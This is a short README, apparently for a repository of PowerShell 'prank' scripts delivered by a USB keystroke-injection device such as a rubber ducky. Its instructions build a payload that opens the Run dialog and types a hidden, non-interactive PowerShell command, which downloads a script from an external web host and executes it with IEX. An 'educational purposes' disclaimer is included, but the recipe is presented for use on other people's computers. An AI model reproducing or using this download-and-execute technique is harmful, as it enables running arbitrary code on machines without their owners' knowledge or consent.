# H1 Some powershell scripts to mess with people :)

**this is for educational purposes only i do not condone any malicous use of these scripts**

> This was primarely made to use with a rubber ducky/raspberry pi pico

# H2 How to use this with a rubber ducky.

- create a new file called payload.dd.
- start with `DELAY 500` (may needs to be bigger depends on how fast ur pc is).
- put in a `GUI r` to open run dialog.
- a new delay of +- 100 is required to make sure the run dialog opens before typing text.
- use `STRING powershell -NoP -NonI -W hidden IEX (New-Object Net.WebClient).DownloadString('https://creepyturnip.github.io/<the script you want>')` to open a hidden powershell that runs a script
- (replace `<script you want>` with the filename of the script you want to use for example: `mouseMove.ps1`)
